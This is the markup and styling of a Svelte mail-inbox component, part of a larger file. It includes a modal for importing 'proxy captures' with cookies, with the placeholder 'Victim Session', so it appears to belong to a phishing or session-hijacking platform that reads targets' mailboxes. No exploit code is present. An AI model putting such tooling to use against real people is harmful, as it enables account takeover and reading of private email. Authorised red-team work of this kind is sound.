				{#if inboxLoading}
					<div class="flex flex-col items-center justify-center py-16">
						<div class="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500 mb-4"></div>
						<p class="text-sm text-gray-500 dark:text-gray-400">{inboxLoadingStatus || 'Loading messages...'}</p>
					</div>
				{:else if inboxMessages.length === 0}
					<div class="flex flex-col items-center justify-center py-16">
						<svg class="w-12 h-12 text-gray-300 dark:text-gray-600 mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4"/></svg>
						<p class="text-sm text-gray-500 dark:text-gray-400">No messages in this folder</p>
					</div>
				{:else}
					<div class="divide-y divide-gray-100 dark:divide-gray-700/50">
						{#each inboxMessages as msg}
							<button
								class="inbox-message-row {msg.isRead ? '' : 'unread'}"
								on:click={() => openMessage(msg.id)}
							>
								<div class="msg-avatar" style="background-color: {getAvatarColor(msg.fromName || msg.from)}">
									{getInitials(msg.fromName || msg.from || '?')}
								</div>
								<div class="msg-content">
									<div class="msg-top-row">
										<span class="msg-sender" class:font-bold={!msg.isRead}>
											{msg.fromName || msg.from || 'Unknown'}
										</span>
										<span class="msg-date">{formatShortDate(msg.date)}</span>
									</div>
									<div class="msg-subject" class:font-semibold={!msg.isRead}>{msg.subject || '(no subject)'}</div>
									<div class="msg-preview">{msg.preview || ''}</div>
								</div>
								<div class="msg-indicators">
									{#if !msg.isRead}
										<span class="unread-dot"></span>
									{/if}
									{#if msg.hasAttachments}
										<svg class="w-3.5 h-3.5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.172 7l-6.586 6.586a2 2 0 102.828 2.828l6.414-6.586a4 4 0 00-5.656-5.656l-6.415 6.585a6 6 0 108.486 8.486L20.5 13"/></svg>
									{/if}
								</div>
							</button>
						{/each}
					</div>

					<!-- Pagination -->
					<div class="inbox-pagination">
						<button
							class="inbox-page-btn"
							on:click={prevInboxPage}
							disabled={inboxSkip === 0}
						>
							<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/></svg>
							Previous
						</button>
						<span class="text-xs text-gray-500 dark:text-gray-400">
							{inboxSkip + 1} - {inboxSkip + inboxMessages.length}
							{#if inboxTotalCount > 0}
								of {inboxTotalCount}
							{/if}
						</span>
						<button
							class="inbox-page-btn"
							on:click={nextInboxPage}
							disabled={inboxMessages.length < inboxLimit}
						>
							Next
							<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/></svg>
						</button>
					</div>
				{/if}
			</div>
		</div>
	</div>
</Modal>

<!-- Message Viewer Modal -->
<Modal
	headerText=""
	visible={isMessageModalVisible}
	onClose={closeMessageModal}
	fullscreen={true}
>
	{#if messageLoading}
		<div class="flex flex-col items-center justify-center py-16">
			<div class="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500 mb-4"></div>
			<p class="text-sm text-gray-500 dark:text-gray-400">Loading message...</p>
		</div>
	{:else if currentMessage}
		<div class="message-viewer">
			<!-- Action Bar -->
			<div class="message-actions">
				<button class="msg-action-btn" on:click={() => openReplyModal(currentMessage)} title="Reply">
					<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h10a8 8 0 018 8v2M3 10l6 6m-6-6l6-6"/></svg>
					<span>Reply</span>
				</button>
				<button class="msg-action-btn" on:click={() => openForwardModal(currentMessage)} title="Forward">
					<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 10h-10a8 8 0 00-8 8v2M21 10l-6 6m6-6l-6-6"/></svg>
					<span>Forward</span>
				</button>
				<div class="flex-1"></div>
				<button class="msg-action-btn" on:click={closeMessageModal} title="Back to Inbox">
					<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 17l-5-5m0 0l5-5m-5 5h12"/></svg>
					<span>Back</span>
				</button>
			</div>

			<!-- Message Header -->
			<div class="message-header-section">
				<div class="flex items-start gap-3">
					<div class="msg-viewer-avatar" style="background-color: {getAvatarColor(currentMessage.fromName || currentMessage.from)}">
						{getInitials(currentMessage.fromName || currentMessage.from || '?')}
					</div>
					<div class="flex-1 min-w-0">
						<h2 class="text-lg font-semibold text-gray-900 dark:text-gray-100 mb-1">{currentMessage.subject || '(no subject)'}</h2>
						<div class="text-sm text-gray-700 dark:text-gray-300">
							<span class="font-medium">{currentMessage.fromName || 'Unknown'}</span>
							<span class="text-gray-500 dark:text-gray-400">&lt;{currentMessage.from || ''}&gt;</span>
						</div>
						{#if currentMessage.to && currentMessage.to.length > 0}
							<div class="text-xs text-gray-500 dark:text-gray-400 mt-1">
								To: {currentMessage.to.join(', ')}
							</div>
						{/if}
					</div>
					<div class="text-xs text-gray-500 dark:text-gray-400 flex-shrink-0 text-right">
						{formatDate(currentMessage.date)}
					</div>
				</div>
			</div>

			<!-- Attachments -->
			{#if currentMessage.attachments && currentMessage.attachments.length > 0}
				<div class="message-attachments">
					<p class="text-xs font-medium text-gray-500 dark:text-gray-400 mb-2 uppercase tracking-wider">
						<svg class="w-3.5 h-3.5 inline mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.172 7l-6.586 6.586a2 2 0 102.828 2.828l6.414-6.586a4 4 0 00-5.656-5.656l-6.415 6.585a6 6 0 108.486 8.486L20.5 13"/></svg>
						{currentMessage.attachments.length} Attachment{currentMessage.attachments.length > 1 ? 's' : ''}
					</p>
					<div class="flex flex-wrap gap-2">
						{#each currentMessage.attachments as att}
							<div class="attachment-chip">
								<svg class="w-4 h-4 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
								<span class="text-sm truncate">{att.name || 'Attachment'}</span>
								{#if att.size}
									<span class="text-xs text-gray-400">{formatFileSize(att.size)}</span>
								{/if}
							</div>
						{/each}
					</div>
				</div>
			{/if}

			<!-- Message Body -->
			<div class="message-body-section">
				{#if currentMessage.bodyHTML}
					<iframe
						srcdoc={currentMessage.bodyHTML}
						class="message-iframe"
						sandbox="allow-same-origin"
						title="Email Content"
					></iframe>
				{:else}
					<pre class="whitespace-pre-wrap text-sm text-gray-700 dark:text-gray-300 leading-relaxed">{currentMessage.bodyText || ''}</pre>
				{/if}
			</div>
		</div>
	{:else}
		<div class="flex flex-col items-center justify-center py-16">
			<svg class="w-12 h-12 text-gray-300 dark:text-gray-600 mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
			<p class="text-sm text-gray-500 dark:text-gray-400">Message not found</p>
		</div>
	{/if}
</Modal>

<!-- Import from Proxy Captures Modal -->
<Modal
	headerText="Import from Proxy Captures"
	visible={isProxyCaptureModalVisible}
	onClose={closeProxyCaptureModal}
>
	{#if proxyCapturesLoading}
		<div class="text-center py-8 opacity-60">Loading proxy captures...</div>
	{:else if proxyCaptures.length === 0}
		<div class="text-center py-8 opacity-60">No proxy captures with cookies found</div>
	{:else}
		<div class="mb-4 mt-4">
			<label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Name (optional)</label>
			<input
				type="text"
				class="w-full px-3 py-2 rounded-md border border-gray-300 dark:border-gray-600 bg-white dark:bg-gray-800 text-gray-900 dark:text-gray-100 focus:outline-none focus:ring-2 focus:ring-cta-blue"
				placeholder="e.g., Victim Session"
				bind:value={proxyCaptureImportName}
			/>
		</div>
		<div class="space-y-2 max-h-[50vh] overflow-y-auto">
			{#each proxyCaptures as capture}
				<button
					class="w-full text-left p-3 rounded-lg border transition-colors cursor-pointer
						{selectedCapture && selectedCapture.ID === capture.ID
							? 'bg-blue-50 dark:bg-blue-900/20 border-blue-400 dark:border-blue-600'
							: 'bg-white dark:bg-gray-800 border-gray-200 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-700/50'}"
					on:click={() => (selectedCapture = capture)}
				>
					<div class="flex justify-between items-start">
						<div class="flex-1 min-w-0">
							<div class="flex items-center gap-2">
								{#if selectedCapture && selectedCapture.ID === capture.ID}
									<span class="w-3 h-3 rounded-full bg-blue-500 flex-shrink-0"></span>
								{/if}
								<span class="font-medium text-sm">
									{capture.Username || capture.IPAddress || 'Unknown'}
								</span>
								{#if capture.TargetDomain}
									<span class="badge badge-info">{capture.TargetDomain}</span>
								{/if}
							</div>
							<div class="text-xs opacity-60 mt-1">
								IP: {capture.IPAddress || 'N/A'}
								{#if capture.Cookies}
									| Cookies: {(() => { try { return JSON.parse(capture.Cookies).length; } catch { return '?'; } })()}
								{/if}
							</div>
						</div>
						<div class="text-xs opacity-50 flex-shrink-0 ml-2">
							{formatDate(capture.CreatedAt)}
						</div>
					</div>
				</button>
			{/each}
		</div>
		<div class="flex justify-end gap-2 mt-4 mb-4">
			<button
				class="px-4 py-2 rounded-md text-sm bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors"
				on:click={closeProxyCaptureModal}
			>
				Cancel
			</button>
			<button
				class="px-4 py-2 rounded-md text-sm bg-cta-blue text-white hover:opacity-80 transition-colors disabled:opacity-50"
				on:click={handleProxyCaptureImport}
				disabled={!selectedCapture}
			>
				Import Selected Capture
			</button>
		</div>
	{/if}
</Modal>

<!-- Delete Alert -->
{#if isDeleteAlertVisible}
	<DeleteAlert
		name={deleteValues.name}
		isVisible={isDeleteAlertVisible}
		onClick={handleDelete}
		on:close={() => (isDeleteAlertVisible = false)}
	/>
{/if}

<style>
	/* Dropdown items */
	.dropdown-item {
		display: flex;
		align-items: center;
		width: 100%;
		padding: 0.5rem 1rem;
		text-align: left;
		border: none;
		background: none;
		cursor: pointer;
		font-size: 0.875rem;
		color: var(--text-primary, #333);
	}
	.dropdown-item:hover {
		background: var(--bg-hover, #f0f0f0);
	}
	.dropdown-item-danger {
		color: rgb(220, 38, 38);
	}
	.dropdown-item-danger:hover {
		background: rgba(239, 68, 68, 0.1);
	}

	/* Badges */
	.badge {
		display: inline-flex;
		align-items: center;
		padding: 0.15rem 0.5rem;
		border-radius: 9999px;
		font-size: 0.7rem;
		font-weight: 600;
		text-transform: uppercase;
		letter-spacing: 0.025em;
	}
	.badge-success { background-color: rgba(34, 197, 94, 0.15); color: rgb(22, 163, 74); }
	.badge-error { background-color: rgba(239, 68, 68, 0.15); color: rgb(220, 38, 38); }
	.badge-warning { background-color: rgba(234, 179, 8, 0.15); color: rgb(202, 138, 4); }
	.badge-info { background-color: rgba(59, 130, 246, 0.15); color: rgb(37, 99, 235); }
	.badge-purple { background-color: rgba(147, 51, 234, 0.15); color: rgb(126, 34, 206); }
	.badge-default { background-color: rgba(107, 114, 128, 0.15); color: rgb(75, 85, 99); }
	:global(.dark) .badge-success { color: rgb(74, 222, 128); }
	:global(.dark) .badge-error { color: rgb(248, 113, 113); }
	:global(.dark) .badge-warning { color: rgb(250, 204, 21); }
	:global(.dark) .badge-info { color: rgb(96, 165, 250); }
	:global(.dark) .badge-purple { color: rgb(192, 132, 252); }
	:global(.dark) .badge-default { color: rgb(156, 163, 175); }

	/* Inbox Layout - Outlook-style */
	.inbox-container {
		display: flex;
		flex-direction: column;
		height: calc(100vh - 80px);
		margin: -2rem -2rem;
		background: #f3f4f6;
		overflow: hidden;
	}
	:global(.dark) .inbox-container { background: #0f172a; }

	.inbox-header {
		display: flex;
		align-items: center;
		justify-content: space-between;
		padding: 10px 20px;
		border-bottom: 1px solid #e5e7eb;
		background: linear-gradient(135deg, #1e40af 0%, #3b82f6 100%);
		color: white;
		flex-shrink: 0;
		box-shadow: 0 1px 3px rgba(0,0,0,0.1);
	}
	:global(.dark) .inbox-header {
		background: linear-gradient(135deg, #1e3a5f 0%, #1e40af 100%);
		border-color: #1e3a5f;
	}
	.inbox-header .w-8 { border: 2px solid rgba(255,255,255,0.3); }
	.inbox-header h2 { color: white !important; }
	.inbox-header p { color: rgba(255,255,255,0.8) !important; }

	.inbox-toolbar-btn {
		display: inline-flex;
		align-items: center;
		gap: 6px;
		padding: 6px 14px;
		border-radius: 6px;
		border: 1px solid rgba(255,255,255,0.3);
		background: rgba(255,255,255,0.15);
		color: white;
		font-size: 0.875rem;
		cursor: pointer;
		transition: all 0.15s;
		backdrop-filter: blur(4px);
	}
	.inbox-toolbar-btn:hover { background: rgba(255,255,255,0.25); }
	.inbox-toolbar-btn:disabled { opacity: 0.5; cursor: not-allowed; }
	:global(.dark) .inbox-toolbar-btn {
		background: rgba(255,255,255,0.1);
		border-color: rgba(255,255,255,0.2);
	}
	:global(.dark) .inbox-toolbar-btn:hover { background: rgba(255,255,255,0.2); }

	.inbox-body {
		display: flex;
		flex: 1;
		overflow: hidden;
	}

	/* Folder Sidebar */
	.inbox-sidebar {
		width: 220px;
		border-right: 1px solid #e5e7eb;
		background: white;
		padding: 12px 8px;
		overflow-y: auto;
		flex-shrink: 0;
	}
	:global(.dark) .inbox-sidebar {
		background: #111827;
		border-color: #1e293b;
	}
	.inbox-folder-btn {
		display: flex;
		align-items: center;
		gap: 10px;
		width: 100%;
		padding: 10px 14px;
		border-radius: 8px;
		border: none;
		background: transparent;
		color: #4b5563;
		font-size: 0.8125rem;
		cursor: pointer;
		transition: all 0.15s;
		text-align: left;
		margin-bottom: 2px;
	}
	.inbox-folder-btn:hover { background: #f3f4f6; color: #1f2937; }
	.inbox-folder-btn.active {
		background: #eff6ff;
		color: #1d4ed8;
		font-weight: 600;
		box-shadow: inset 3px 0 0 #3b82f6;
		border-radius: 0 8px 8px 0;
	}
	.inbox-folder-btn:disabled { opacity: 0.5; }
	:global(.dark) .inbox-folder-btn { color: #9ca3af; }
	:global(.dark) .inbox-folder-btn:hover { background: #1e293b; color: #e5e7eb; }
	:global(.dark) .inbox-folder-btn.active {
		background: rgba(59, 130, 246, 0.15);
		color: #60a5fa;
		box-shadow: inset 3px 0 0 #3b82f6;
	}
	.folder-icon { display: flex; flex-shrink: 0; opacity: 0.7; }
	.inbox-folder-btn.active .folder-icon { opacity: 1; }
	.folder-name { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
	.folder-badge {
		background: #3b82f6;
		color: white;
		font-size: 0.625rem;
		font-weight: 700;
		padding: 2px 7px;
		border-radius: 9999px;
		flex-shrink: 0;
		min-width: 18px;
		text-align: center;
	}

	/* Message List */
	.inbox-message-list {
		flex: 1;
		overflow-y: auto;
		background: white;
	}
	:global(.dark) .inbox-message-list { background: #1e293b; }

	.inbox-message-row {
		display: flex;
		align-items: flex-start;
		gap: 12px;
		width: 100%;
		padding: 14px 20px;
		border: none;
		background: transparent;
		cursor: pointer;
		text-align: left;
		transition: all 0.12s ease;
		border-left: 3px solid transparent;
	}
	.inbox-message-row:hover {
		background: #f8fafc;
		border-left-color: #cbd5e1;
	}
	.inbox-message-row.unread {
		background: #eff6ff;
		border-left-color: #3b82f6;
	}
	.inbox-message-row.unread:hover {
		background: #dbeafe;
	}
	:global(.dark) .inbox-message-row:hover {
		background: #334155;
		border-left-color: #475569;
	}
	:global(.dark) .inbox-message-row.unread {
		background: rgba(59, 130, 246, 0.08);
		border-left-color: #3b82f6;
	}
	:global(.dark) .inbox-message-row.unread:hover {
		background: rgba(59, 130, 246, 0.15);
	}

	.msg-avatar {
		width: 40px;
		height: 40px;
		border-radius: 50%;
		display: flex;
		align-items: center;
		justify-content: center;
		color: white;
		font-size: 0.8rem;
		font-weight: 600;
		flex-shrink: 0;
		margin-top: 2px;
		box-shadow: 0 1px 3px rgba(0,0,0,0.1);
	}
	.msg-content { flex: 1; min-width: 0; }
	.msg-top-row { display: flex; justify-content: space-between; align-items: baseline; gap: 8px; }
	.msg-sender { font-size: 0.875rem; color: #1f2937; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
	:global(.dark) .msg-sender { color: #e5e7eb; }
	.msg-date { font-size: 0.75rem; color: #9ca3af; flex-shrink: 0; }
	.msg-subject { font-size: 0.8125rem; color: #374151; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; margin-top: 2px; }
	:global(.dark) .msg-subject { color: #d1d5db; }
	.msg-preview { font-size: 0.75rem; color: #9ca3af; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; margin-top: 3px; line-height: 1.4; }
	.msg-indicators { display: flex; flex-direction: column; align-items: center; gap: 4px; flex-shrink: 0; padding-top: 6px; }
	.unread-dot {
		width: 9px;
		height: 9px;
		border-radius: 50%;
		background: #3b82f6;
		box-shadow: 0 0 4px rgba(59, 130, 246, 0.4);
	}

	/* Pagination */
	.inbox-pagination {
		display: flex;
		align-items: center;
		justify-content: space-between;
		padding: 10px 20px;
		border-top: 1px solid #e5e7eb;
		background: #fafafa;
		flex-shrink: 0;
	}
	:global(.dark) .inbox-pagination { background: #0f172a; border-color: #1e293b; }
	.inbox-page-btn {
		display: inline-flex;
		align-items: center;
		gap: 4px;
		padding: 6px 14px;
		border-radius: 6px;
		border: 1px solid #d1d5db;
		background: white;
		color: #374151;
		font-size: 0.8125rem;
		cursor: pointer;
		transition: all 0.15s;
	}
	.inbox-page-btn:hover { background: #f3f4f6; }
	.inbox-page-btn:disabled { opacity: 0.4; cursor: not-allowed; }
	:global(.dark) .inbox-page-btn { background: #1e293b; border-color: #334155; color: #d1d5db; }
	:global(.dark) .inbox-page-btn:hover { background: #334155; }

	/* Message Viewer */
	.message-viewer {
		display: flex;
		flex-direction: column;
		height: calc(100vh - 80px);
		margin: -2rem -2rem;
		background: #f8fafc;
	}
	:global(.dark) .message-viewer { background: #0f172a; }

	.message-actions {
		display: flex;
		align-items: center;
		gap: 6px;
		padding: 10px 20px;
		border-bottom: 1px solid #e5e7eb;
		background: white;
		flex-shrink: 0;
		box-shadow: 0 1px 2px rgba(0,0,0,0.04);
	}
	:global(.dark) .message-actions { background: #1e293b; border-color: #334155; }
	.msg-action-btn {
		display: inline-flex;
		align-items: center;
		gap: 6px;
		padding: 7px 14px;
		border-radius: 6px;
		border: 1px solid #e5e7eb;
		background: white;
		color: #374151;
		font-size: 0.8125rem;
		cursor: pointer;
		transition: all 0.15s;
	}
	.msg-action-btn:hover { background: #f3f4f6; border-color: #d1d5db; }
	:global(.dark) .msg-action-btn { background: #334155; border-color: #475569; color: #d1d5db; }
	:global(.dark) .msg-action-btn:hover { background: #475569; }

	.message-header-section {
		padding: 20px 24px;
		border-bottom: 1px solid #e5e7eb;
		background: white;
		flex-shrink: 0;
	}
	:global(.dark) .message-header-section { border-color: #334155; background: #1e293b; }
	.msg-viewer-avatar {
		width: 48px;
		height: 48px;
		border-radius: 50%;
		display: flex;
		align-items: center;
		justify-content: center;
		color: white;
		font-size: 1.1rem;
		font-weight: 600;
		flex-shrink: 0;
		box-shadow: 0 2px 4px rgba(0,0,0,0.1);
	}

	.message-attachments {
		padding: 12px 24px;
		border-bottom: 1px solid #e5e7eb;
		background: #f8fafc;
		flex-shrink: 0;
	}
	:global(.dark) .message-attachments { background: #0f172a; border-color: #334155; }
	.attachment-chip {
		display: inline-flex;
		align-items: center;
		gap: 6px;
		padding: 8px 14px;
		border: 1px solid #e5e7eb;
		border-radius: 8px;
		background: white;
		max-width: 220px;
		transition: all 0.15s;
		cursor: pointer;
	}
	.attachment-chip:hover { background: #f3f4f6; border-color: #d1d5db; }
	:global(.dark) .attachment-chip { background: #1e293b; border-color: #334155; }
	:global(.dark) .attachment-chip:hover { background: #334155; }

	.message-body-section {
		flex: 1;
		overflow: auto;
		padding: 24px;
		background: white;
	}
	:global(.dark) .message-body-section { background: #1e293b; }
	.message-iframe {
		width: 100%;
		min-height: 500px;
		height: 100%;
		border: none;
		background: white;
		border-radius: 8px;
		box-shadow: 0 1px 3px rgba(0,0,0,0.06);
	}

	/* Responsive */
	@media (max-width: 768px) {
		.inbox-sidebar { width: 64px; padding: 6px 4px; }
		.folder-name { display: none; }
		.folder-badge { display: none; }
		.inbox-folder-btn { justify-content: center; padding: 10px 6px; }
		.inbox-folder-btn.active { box-shadow: none; border-radius: 8px; }
		.msg-avatar { width: 32px; height: 32px; font-size: 0.7rem; }
		.inbox-message-row { padding: 10px 12px; }
	}
</style>
